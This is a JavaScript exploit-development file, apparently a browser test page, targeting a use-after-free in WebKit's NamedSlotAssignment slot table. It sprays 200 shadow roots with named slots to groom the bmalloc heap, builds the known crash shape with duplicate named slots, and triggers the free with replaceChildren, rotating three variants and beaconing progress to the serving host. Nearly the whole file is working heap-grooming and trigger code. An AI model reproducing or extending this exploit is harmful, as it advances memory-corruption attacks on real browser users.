// p501 — NamedSlotAssignment UAF exploitation angle: WTF HashMap pre-spray.
//
// The freed table is NamedSlotAssignment::m_slots (WTF HashMap, 144 B cap-8:
// 16 metadata + 8*16 buckets). mja00's ArrayBuffer sprays are a different heap
// and never helped. This pre-sprays hundreds of LIVE NamedSlotAssignment tables
// (shadow roots with named slots) so the target table's bmalloc page stays
// mapped when resolveSlotsAfterSlotMutation frees it mid-iteration.
//
// Variants (localStorage p501var):
//   0 wtfspray  : 200 shadow roots with named slots, then the crash trigger
//   1 wtfcontrol: same, plus slot1.assignedNodes()+layout before trigger
//   2 wtflayout : same, plus host.offsetWidth before trigger
(function () {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  var staged = [];
  ['BOOT','SPRAY','BUILT','PRE','TRIGGER','POST','DONE','ERR','HTMLERR']
    .forEach(function (n) {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V501-' + n);
      staged.push([n, x]);
    });
  function S(name, body) {
    try {
      for (var i = 0; i < staged.length; i++)
        if (staged[i][0] === name) { staged[i][1].send('[' + (Date.now() - T0) + 'ms] ' + (body || '')); return; }
    } catch (e) {}
  }

  var VARIANTS = ['wtfspray', 'wtfcontrol', 'wtflayout'];
  var vi = 0;
  try {
    vi = parseInt(localStorage.getItem('p501var') || '0', 10);
    if (isNaN(vi) || vi < 0) vi = 0;
    if (vi >= VARIANTS.length) vi = 0;
    localStorage.setItem('p501var', String((vi + 1) % VARIANTS.length));
  } catch (e) {}
  var variant = VARIANTS[vi];
  S('BOOT', 'variant=' + variant + ' idx=' + vi + ' ' + navigator.userAgent);

  // Pre-spray LIVE NamedSlotAssignment HashMaps: each shadow root with a named
  // slot + matching light child forces the slot-assignment table allocation.
  var pre = [];
  try {
    for (var i = 0; i < 200; i++) {
      var h = document.createElement('div');
      document.body.appendChild(h);
      var sr = h.attachShadow({ mode: 'open' });
      var sl = document.createElement('slot');
      sl.setAttribute('name', 'p' + i);
      sr.appendChild(sl);
      var c = document.createElement('span');
      c.setAttribute('slot', 'p' + i);
      h.appendChild(c);
      try { sl.assignedNodes(); } catch (e) {}
      pre.push(h);
    }
  } catch (e) {
    S('ERR', 'spray ' + String(e && e.message).substring(0, 60));
    return;
  }
  S('SPRAY', 'shadowRoots=' + pre.length);

  // Target: exact upstream crash shape.
  var host, sr2, container, slot1, slot2, match;
  try {
    host = document.createElement('div');
    document.body.appendChild(host);
    sr2 = host.attachShadow({ mode: 'open' });
    container = document.createElement('div');
    sr2.appendChild(container);
    slot1 = document.createElement('slot');
    slot1.setAttribute('name', 'X');
    container.appendChild(slot1);
    slot2 = document.createElement('slot');
    slot2.setAttribute('name', 'X');
    container.appendChild(slot2);
    match = document.createElement('span');
    match.setAttribute('slot', 'X');
    host.appendChild(match);
    for (var j = 0; j < 12; j++) {
      var sp = document.createElement('span');
      sp.setAttribute('slot', 'new' + j);
      host.appendChild(sp);
    }
  } catch (e) {
    S('ERR', 'build ' + String(e && e.message).substring(0, 60));
    return;
  }
  S('BUILT', 'slots=2 match=1 fresh=12');

  if (variant === 'wtfcontrol') {
    try { slot1.assignedNodes(); host.offsetWidth; } catch (e) {}
    S('PRE', 'assignedNodes+layout');
  } else if (variant === 'wtflayout') {
    try { host.offsetWidth; } catch (e) {}
    S('PRE', 'layout');
  } else {
    S('PRE', 'none');
  }

  S('TRIGGER', 'replaceChildren');
  try {
    container.replaceChildren();
  } catch (e) {
    S('ERR', 'trigger ' + String(e && e.message).substring(0, 60));
    return;
  }
  S('POST', 'survived');
  S('DONE', '');
})();
